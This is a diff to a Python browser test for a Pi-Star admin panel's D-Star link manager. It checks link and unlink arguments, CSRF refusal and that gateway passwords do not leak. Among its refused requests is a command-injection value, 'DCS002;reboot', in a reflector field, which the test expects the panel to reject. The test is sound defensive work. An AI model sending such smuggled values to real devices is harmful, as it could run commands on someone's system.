+        wait("D-Star Link Manager form", lambda: v.js("return !!document.querySelector('#dstarLinkManager select[name=Module] option')"))
+        choose("Module", module)
+        if ref is not None:
+            choose("RefName", ref)
+        choose("Letter", letter)
+        v.js("document.querySelector(`#dstarLinkManager input[name=Link][value=\"${arguments[0]}\"]`).click()", action)
+        before = len(calls())
+        v.click('#dstarLinkManager input[type=submit]')
+        wait("Command Output " + DSTAR_ACCEPTED, lambda: v.js(
+            "return [...document.querySelectorAll('td')].some(td => td.textContent.trim() === arguments[0])", DSTAR_ACCEPTED))
+        new = calls()[before:]
+        equal("one remotecontrold call", len(new), 1)
+        call = new[0]
+        equal("remotecontrold settings", (call["address"], call["port"], call["password_sha256"], call["home_mode"], call["conf_mode"]),
+              ("127.0.0.1", "10022", sha256(DSTAR_PASSWORD.encode()).hexdigest(), "0o700", "0o600"))
+        equal("remotecontrold environment", call["env"], ["HOME", "LANG", "PATH"])
+        equal("private HOME removed", stand.exists(call["home"]), False)
+        wait("form back after 2 s", lambda: v.js("return !!document.querySelector('#dstarLinkManager')"), timeout=8)
+        return call["argv"]
+
+    def post(body, csrf=True):
+        return v.command('/execute/async', {'script': """const done=arguments[arguments.length-1];
+          fetch('/manage/api/links/dstar',{cache:'no-store'}).then(r=>r.json()).then(d=>fetch('/manage/api/links/dstar',
+          {method:'POST',headers:{'Content-Type':'application/json','X-PiStar-CSRF':arguments[1]?d.csrf:''},body:JSON.stringify(arguments[0])}))
+          .then(async r=>done([r.status,(await r.text()).trim()]))""", 'args': [body, csrf]})
+
+    def no_password(stage):
+        for e in v.events():
+            p = e["params"]
+            if e["method"] == "Network.requestWillBeSent" and "/api/" in p["request"]["url"]:
+                seen.append(p["request"].get("postData", ""))
+            if e["method"] == "Network.responseReceived" and "/api/" in p["response"]["url"]:
+                try:
+                    seen.append(v.cdp("Network.getResponseBody", {"requestId": p["requestId"]})["body"])
+                except Exception:  # a body the page dropped carries nothing to leak
+                    pass
+        texts = {"page": v.js("return document.documentElement.outerHTML"), "network": "\n".join(seen),
+                 "logs": stand.read("/tmp/pistar-wizard.log").decode(errors="replace") + stand.read("/tmp/pistar-panel.log").decode(errors="replace")}
+        for name, text in texts.items():
+            for secret in (DSTAR_PASSWORD, "irc-Secret-3"):
+                if secret in text:
+                    raise AssertionError(f"{stage}: a gateway password is visible in the {name}")
+
+    links = [["M1ABC  B", "DCS001 C", "Auto", "Never", "Up", "DCS001 C", "DCS", "Outgoing", "06:10:01 Nov 27th"],
+             ["M1ABC  B", "", "", "", "Up", "XRF023 A", "DExtra", "Incoming", "06:11:02 Nov 27th"],
+             ["M1ABC  B", "", "", "", "Up", "W1CDG", "DPlus", "Incoming", "06:12:03 Nov 27th"],
+             ["M1ABC  C", "", "No", "5min", "Down", "None", "--", "----", "----"],
+             ["M1ABC  C", "", "", "", "Up", "W1CDG", "DPlus", "Incoming", "06:12:03 Nov 27th"]]
+    ccs = [["M1ABC  B", "DL5DI", "CCS", "Incoming", "06:13:04 Nov 27th"]]
+    groups = [["STN001 A", "STN001 L", "QA Net", "300", "0"]]
+    members = [["06:31:00 Nov 27th", "STN001 A", "2E0ABC"], ["06:33:00 Nov 27th", "STN001 A", "M0XYZ"]]
+
+    def common_panels(stage):
+        wait(stage + " reflector links", lambda: rows("#refLinks tr:not(:first-child)") == links, timeout=10)
+        equal(stage + " link table title", v.js("return document.querySelector('#refLinks > b')?.textContent"), "D-Star Link Information")
+        equal(stage + " CCS rows", rows("#cssConnects table:nth-of-type(1) tr:not(:first-child)"), ccs)
+        titles = v.js("return [...document.querySelectorAll('#cssConnects > b')].map(b => b.textContent)")
+        equal(stage + " CCS titles", titles, ["Active CCS Connections", "Active Starnet Groups", "Active Starnet Group Members"])
+        equal(stage + " StarNet groups", rows("#cssConnects table:nth-of-type(2) tr:not(:first-child)"), groups)
+        equal(stage + " StarNet members", rows("#cssConnects table:nth-of-type(3) tr:not(:first-child)"), members)
+        wait(stage + " link manager", lambda: v.js("return !!document.querySelector('#dstarLinkManager select[name=Module] option')"))
+        equal(stage + " modules", v.js("return [...document.querySelectorAll('#dstarLinkManager select[name=Module] option')].map(o => o.value)"),
+              ["M1ABC  B", "M1ABC  C"])
+        equal(stage + " reflectors", v.js("return [...document.querySelectorAll('#dstarLinkManager select[name=RefName] option')].map(o => o.textContent)"),
+              ["DCS001", "Text Entry", "DCS001", "DCS002", "XLX000", "REF001", "XRF757", "XRF001", "XRF023"])
+        equal(stage + " letters", v.js("return [...document.querySelectorAll('#dstarLinkManager select[name=Letter] option')].map(o => o.value).join('')"),
+              "C" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ")
+
+    v.events()
+    # 1. MMDVMHost with the D-Star network: links, link manager and CCS in the content column
+    reload()
+    common_panels("MMDVMHost")
+    equal("MMDVMHost: no gateway table or D-Star heard lists", v.js("return !!document.querySelector('#lh, #localTx')"), False)
+    equal("MMDVMHost: side menu kept", v.js("return !!document.querySelector('.nav')"), True)
+    # 2. link, unlink and Text Entry run the fake with exactly the classic arguments
+    equal("link", request("M1ABC  C", "XRF023", "A"), ["M1ABC  C", "link", "never", "XRF023 A"])
+    equal("unlink", request("M1ABC  B", None, "C", "UNLINK"), ["M1ABC  B", "unlink"])
+    wait("form", lambda: v.js("return !!document.querySelector('#dstarLinkManager select[name=RefName]')"))
+    choose("RefName", "customOption")
+    wait("Text Entry field", lambda: v.js("return !!document.querySelector('#dstarLinkManager input[name=RefName]')"))
+    v.type_into('#dstarLinkManager input[name=RefName]', "xlx123")
+    equal("Text Entry", request("M1ABC  B", None, "D"), ["M1ABC  B", "link", "never", "XLX123 D"])
+    # 3. refused requests run nothing
+    before = len(calls())
+    for body, csrf, status in (
+            ({"action": "LINK", "module": "M1ABC  B", "refName": "DCS002", "letter": "B"}, False, 403),
+            ({"action": "LINK", "module": "M1ABC  B", "refName": "DCS002;reboot", "letter": "B", "custom": True}, True, 400),
+            ({"action": "UNLINK", "module": "G0XYZ  B"}, True, 422),
+            ({"action": "LINK", "module": "M1ABC  B", "refName": "REF999", "letter": "A"}, True, 422)):
+        equal(f"refused {body}", post(body, csrf)[0], status)
+    equal("self link", post({"action": "LINK", "module": "M1ABC  B", "refName": "M1ABC", "letter": "B", "custom": True}),
+          [200, '{"output":"Cannot link to myself - Aborting link request!"}'])
+    equal("refused requests ran nothing", len(calls()), before)
+    no_password("MMDVMHost")
+    # 3b. the classic bare-text message for bad input, shown by the page itself
+    choose("RefName", "customOption")
+    wait("Text Entry field", lambda: v.js("return !!document.querySelector('#dstarLinkManager input[name=RefName]')"))
+    v.type_into('#dstarLinkManager input[name=RefName]', "bad;x")
+    v.click('#dstarLinkManager input[type=submit]')
+    wait("classic input message", lambda: "Somthing wrong with your input, try again" in v.js("return document.querySelector('.content').innerText"))
+    equal("bad input ran nothing", len(calls()), before)
+    wait("form back", lambda: v.js("return !!document.querySelector('#dstarLinkManager')"), timeout=8)
+    # 4. DStarRepeater controller: D-Star only page, gateway config and Headers.log lists
+    stand.exec("sh", "-c", 'rm -f "$1" && touch "$2"', "sh", *markers)
+    reload()
+    wait("DStarRepeater layout", lambda: v.js("return !!document.querySelector('#lh table') && !document.querySelector('.nav')"), timeout=10)
+    equal("gateway software config", rows(".contentwide:not(#sysInfo) > table tr"),
+          [["ircDDB Network", "APRS Host", "CCS", "DCS", "DExtra", "DPlus", "D-Rats", "Info", "ircDDB", "Echo", "Log"],
+           ["ircv4.openquad.net", "rotate.aprs2.net", "OFF", "ON", "ON", "ON", "OFF", "ON", "ON", "ON", "ON"]])
+    common_panels("DStarRepeater")
+    heard = [["06:25:00 Nov 27th", "2E0ABC (dPRS)", "CQCQCQ", "M1ABC  B", "M1ABC  G"],
+             ["06:23:00 Nov 27th", "PD1RB/IC92 (dPRS)", "CQCQCQ", "PE1RJV B", "REF017 A"],
+             ["06:22:00 Nov 27th", "M0XYZ/ID51 (dPRS)", "DCS001CL", "M1ABC  B", "M1ABC  G"],
+             ["06:21:00 Nov 27th", "PU2ZHZ/T (dPRS)", "CQCQCQ", "PU2ZHZ B", "DCS007 B"]]
+    equal("Gateway Activity", rows("#lh tr:not(:first-child)"), heard)
+    equal("Local RF Activity", rows("#localTx tr:not(:first-child)"), [heard[0], heard[2]])
+    equal("list titles", v.js("return [document.querySelector('#lh > b').textContent, document.querySelector('#localTx > b').textContent]"),
+          ["Gateway Activity", "Local RF Activity"])
+    equal("lookup links", v.js("return [...document.querySelectorAll('#lh tr:nth-child(3) a')].map(a => a.href)"),
+          ["https://database.radioid.net/database/view?callsign=PD1RB", "https://aprs.fi/#!call=PD1RB*"])
+    equal("DStarRepeater unlink", request("M1ABC  C", None, "C", "UNLINK"), ["M1ABC  C", "unlink"])
+    no_password("DStarRepeater")
+    # restore the fixture: markers off, original MMDVMHost INI bytes and mode
+    stand.exec("rm", "-f", *markers)
+    stand.exec("sh", "-c", 'printf "%s" "$2" >"$1" && chown mmdvm:mmdvm "$1" && chmod 640 "$1"', "sh", host_ini, original[0].decode())
+    same_pair("D-Star leaves radio files", stand.pair(), original)
+    equal("D-Star restarts", stand.restarts(), history)
+    print("PASS Chromium D-Star: MMDVMHost with the D-Star network shows D-Star Link Information (module B linked out to DCS001 C, "
+          "incoming XRF023 A and dongle W1CDG; module C Down, 5min timer), the D-Star Link Manager and Active CCS Connections with "
+          "Starnet groups/members from the classic logs; DStarRepeater adds the gateway software config, Gateway Activity "
+          "(newest per station, /TIME dropped) and Local RF Activity without the side menu; link, unlink and Text Entry run the "
+          "fake remotecontrold once each with exactly [module, link, never, reflector] / [module, unlink], a private 0700 HOME "
+          "with a 0600 .Remote Control (127.0.0.1, remotePort, remotePassword) that is removed afterwards; CSRF 403, bad input "
+          "400, unknown module/reflector 422 and self-link run nothing; the gateway passwords never reach the page, network "
+          "or logs; radio files and services untouched", flush=True)
+
+
 def main():
     parser = argparse.ArgumentParser(description=__doc__)
     parser.add_argument("--origin", type=loopback_origin, required=True)
     parser.add_argument("--services", action="store_true")
+    parser.add_argument("--expert", action="store_true")
+    parser.add_argument("--backup", action="store_true")
+    parser.add_argument("--configure", action="store_true")
+    parser.add_argument("--css", action="store_true")
+    parser.add_argument("--factory", action="store_true")
+    parser.add_argument("--wifi", action="store_true")
+    parser.add_argument("--calibration", action="store_true")
+    parser.add_argument("--jitter", action="store_true")
+    parser.add_argument("--tgif", action="store_true")
+    parser.add_argument("--hoseline", action="store_true")
+    parser.add_argument("--dstar", action="store_true")
     parser.add_argument("--key", type=Path, required=True)
     parser.add_argument("--work", type=Path, required=True)
     parser.add_argument("--container", type=stand_name, required=True)
     args = parser.parse_args()
     stand = Stand(args.container)
     original = stand.pair()
-    changed = changed_pair(original)
+    # Only the default settings scenario edits these two lines; --tgif rewrites the master first.
+    changed = None if args.tgif else changed_pair(original)
     password = (args.work / "admin-password").read_text().rstrip("\r\n")
     if not password:
         raise ValueError("empty stand admin-password")
@@ -287,14 +1319,54 @@ def main():
     # TemporaryDirectory creates a mode-0700 directory for both download and upload.
     with TemporaryDirectory(prefix="write-browser-", dir=shared) as folder:
         with chromium(args.origin, args.key) as command:
-            auth = args.origin.replace("://", f"://admin:{quote(password, safe='')}@", 1)
+            auth = args.origin.replace("://", f"://pi-star:{quote(password, safe='')}@", 1)
             command("/url", {"url": auth + "/manage/"})
             cdp(command, "Browser.setDownloadBehavior", behavior="allow", downloadPath=folder)
             v = Admin(command, args.origin + "/manage/", 1280, 900, False)
-            if args.services:
-                exercise_services(v, stand, original)
-            else:
-                exercise(v, stand, Path(folder), original, changed)
+            # /manage/ is the classic admin page; the station settings, DMR
+            # services and backup pages live under their own sections.
+            if not (args.expert or args.backup or args.configure or args.css or args.factory or args.wifi or args.calibration or args.jitter or args.tgif
+                    or args.hoseline or args.dstar):
+                command("/url", {"url": args.origin + "/manage/#settings"})
+                wait("workspace menu did not load", lambda: v.js("return !!document.querySelector('nav a[href=\"#services\"]')"))
+            try:
+                run_scenario(args, v, stand, folder, original, changed)
+            except AssertionError:
+                print("DEBUG page:", v.js("return location.href + ' :: ' + document.body.innerHTML.slice(0, 2500)"), flush=True)
+                try:
+                    print("DEBUG console:", v.command("/se/log", {"type": "browser"}), flush=True)
+                except Exception as e:
+                    print("DEBUG console unavailable:", e, flush=True)
+                raise
+
+
+def run_scenario(args, v, stand, folder, original, changed):
+    if args.expert:
+        exercise_expert(v, stand, args.origin, original)
+    elif args.backup:
+        exercise_backup(v, stand, args.origin, Path(folder), original)
+    elif args.configure:
+        exercise_configure(v, stand, args.origin, original)
+    elif args.css:
+        exercise_css(v, stand, args.origin, original)
+    elif args.factory:
+        exercise_factory(v, stand, args.origin, original)
+    elif args.wifi:
+        exercise_wifi(v, stand, args.origin, original)
+    elif args.calibration:
+        exercise_calibration(v, stand, args.origin, original)
+    elif args.jitter:
+        exercise_jitter(v, stand, args.origin, original)
+    elif args.tgif:
+        exercise_tgif(v, stand, args.origin, original)
+    elif args.hoseline:
+        exercise_hoseline(v, stand, args.origin, original)
+    elif args.dstar:
+        exercise_dstar(v, stand, args.origin, original)
+    elif args.services:
+        exercise_services(v, stand, original)
+    else:
+        exercise(v, stand, Path(folder), original, changed)
 
 
 if __name__ == "__main__":
